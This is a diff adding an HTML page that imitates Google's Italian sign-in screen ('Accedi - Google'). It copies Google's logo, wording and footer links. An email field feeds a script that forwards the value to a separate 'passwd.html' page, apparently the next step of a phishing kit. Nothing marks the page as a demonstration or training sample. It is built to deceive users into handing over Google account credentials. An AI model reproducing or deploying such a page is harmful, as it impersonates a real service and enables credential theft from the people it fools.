@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <title>Accedi - Google</title>
+    <style>
+        body {
+            background-color: rgb(30, 31, 32);
+            color: white;
+            font-family: "Roboto", sans-serif;
+            font-size: 0.875rem;
+            font-weight: 500;
+            line-height: 1.4285714286;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background-color: #0e0e0e;
+            width: 50%;
+            height: 50%;
+            display: flex;
+            margin: 0 auto;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 48px 0;
+            border-radius: 28px;
+        }
+
+        .mb-8 {
+            margin-bottom: 2rem;
+        }
+
+        .text-center {
+            text-align: center;
+        }
+
+        .mb-6 {
+            margin-bottom: 1.5rem;
+        }
+
+        .text-3xl {
+            font-size: 1.875rem;
+        }
+
+        .font-normal {
+            font-weight: 400;
+        }
+
+        .text-sm {
+            font-size: 0.875rem;
+        }
+
+        .text-xs {
+            font-size: 0.75rem;
+        }
+
+        .text-gray-300 {
+            color: #d1d5db;
+        }
+
+        .text-gray-400 {
+            color: #9ca3af;
+        }
+
+        .w-80 {
+            width: 20rem;
+        }
+
+        .form-group {
+            position: relative;
+            margin-bottom: 1.5rem;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 1.2rem 0.75rem 0.5rem;
+            background: transparent;
+            border: 1px solid rgb(196, 199, 197);
+            border-radius: 4px;
+            color: rgb(196, 199, 197);
+            outline: none;
+            font-size: 1rem;
+        }
+
+        .form-input:focus {
+            border: 2px solid #a8c7fa;
+            outline: none;
+            box-shadow: none;
+        }
+
+        .form-label {
+            position: absolute;
+            top: 1.05rem;
+            left: 0.75rem;
+            color: #aaa;
+            font-size: 1rem;
+            pointer-events: none;
+            background: #0e0e0e;
+            padding: 0 0.25rem;
+            transition: 0.2s ease all;
+            transform-origin: center center;
+        }
+
+        .form-input:focus + .form-label,
+        .form-input:not(:placeholder-shown) + .form-label {
+            top: -0.55rem;
+            left: 0.6rem;
+            font-size: 0.75rem;
+            color: #a8c7fa;
+        }
+
+        .links {
+            color: #a8c7fa;
+            text-decoration: none;
+        }
+
+        .links:hover {
+            text-decoration: underline;
+        }
+
+        .mt-6 {
+            margin-top: 1.5rem;
+        }
+
+        .mb-4 {
+            margin-bottom: 1rem;
+        }
+
+        .flex {
+            display: flex;
+        }
+
+        .justify-between {
+            justify-content: space-between;
+        }
+
+        .justify-center {
+            justify-content: center;
+        }
+
+        .items-center {
+            align-items: center;
+        }
+
+        .space-x-4 > *:not(:last-child) {
+            margin-right: 1rem;
+        }
+
+        .next {
+            background-color: #a8c7fa;
+            color: #0b3273;
+            padding: 10px 20px;
+            width: 27%;
+            border-radius: 30px;
+            text-align: center;
+            border: none;
+            cursor: pointer;
+        }
+
+        footer {
+            width: 48%;
+            padding: 1.5rem 2rem;
+            font-size: 0.75rem;
+            color: #9ca3af;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .caret-down::after {
+            content: "▼";
+            display: inline-block;
+            margin-left: 0.3em;
+            font-size: 0.6em;
+            vertical-align: middle;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="mb-8">
+            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
+                <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
+                <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
+                <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
+                <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
+            </svg>
+        </div>
+        <div class="text-center mb-6">
+            <h1 class="text-3xl font-normal mb-2">Accedi</h1>
+            <p class="text-sm text-gray-300">Utilizza il tuo Account Google</p>
+        </div>
+        <div class="w-80">
+            <div class="form-group">
+                <input type="text" id="email" name="email" class="form-input" placeholder=" " required>
+                <label for="email" class="form-label">Email o telefono</label>
+            </div>
+
+            <a href="#" class="links">Non ricordi l'indirizzo email?</a>
+
+            <p class="text-xs text-gray-400 mt-6 mb-4">
+                Non si tratta del tuo computer? Utilizza una finestra privata per accedere.
+                <a href="#" class="links">Scopri di più sull'utilizzo della modalità Ospite</a>
+            </p>
+
+            <div class="flex justify-between items-center">
+                <a href="#" class="links">Crea un account</a>
+                <button class="next" type="submit" onclick="redirect()" ><strong>Avanti</strong></button>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <div class="flex space-x-4">
+            <a href="#" class="links" style="color: rgb(196, 199, 197)">Italiano</a>
+            <span class="caret-down"></span>
+        </div>
+        <div class="flex space-x-4">
+            <a href="#" class="links" style="color: rgb(196, 199, 197)">Guida</a>
+            <a href="#" class="links" style="color: rgb(196, 199, 197)">Privacy</a>
+            <a href="#" class="links" style="color: rgb(196, 199, 197)">Termini</a>
+        </div>
+    </footer>
+
+    <script>
+        function redirect() {
+          const email = document.getElementById('email').value;
+          if (!email) {
+            alert('Inserisci un indirizzo email o telefono.');
+            return;
+          }
+          const emailEncoded = encodeURIComponent(email);
+          window.location.href = `passwd.html?email=${emailEncoded}`;
+
+        }
+      </script>
+</body>
+</html>
